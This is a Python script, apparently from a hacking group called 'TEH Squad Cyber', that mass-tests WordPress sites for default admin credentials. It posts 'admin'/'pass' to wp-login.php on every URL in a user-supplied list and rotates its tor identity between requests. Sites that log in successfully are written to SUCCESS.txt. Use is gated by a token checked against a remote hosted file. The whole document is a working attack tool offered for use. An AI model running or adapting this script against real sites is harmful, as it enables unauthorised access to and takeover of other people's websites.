import requests, time, os
from colorama import Fore
#Author : Hidayat
#Team   : TEH Squad Cyber
#Last Update : 27 February 2020

def function():
    print(f"{Fore.BLUE}")
    os.system('clear && figlet Sec4Safe')
    check = input(f"{Fore.BLUE}list> {Fore.WHITE}")
    lizt = open(f"{check}","r").readlines()
    for url in lizt:
        url = url.strip()
        headers = {'User-Agent':'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:73.0) Gecko/20100101 Firefox/73.0'}
        data = {'log':'admin','pwd':'pass','wp-submit':'Log+In','redirect_to':url+'wp-admin/','testcookie':'1'}
        try:
           req = requests.post(url+ "wp-login.php", data=data, headers=headers)
           os.system('killall -HUP tor')
        except:
              continue
        if 'wordpress_logged_in' in str(req.cookies):
          print(f"{Fore.GREEN}Default U/P {Fore.WHITE}> {url}")
          defaultz = open("SUCCESS.txt","a")
          defaultz.write(f"./Sec4Safe@Check> {url}")
          defaultz.close()
        else:
            print(f"{Fore.RED}Not Default U/P {Fore.WHITE}> {url}")

def user_tools():
    print(f"{Fore.BLUE}")
    os.system('clear && figlet Sec4Safe')
    server = input(f"{Fore.BLUE}token> {Fore.WHITE}")
    check = requests.get(f"http://sec4safe.000webhostapp.com/data.txt").text
    if str(server) in check:
      function()
    else:
        print(f"{Fore.BLUE}[{Fore.RED}!{Fore.BLUE}] {Fore.RED}Fuck User...")


user_tools()
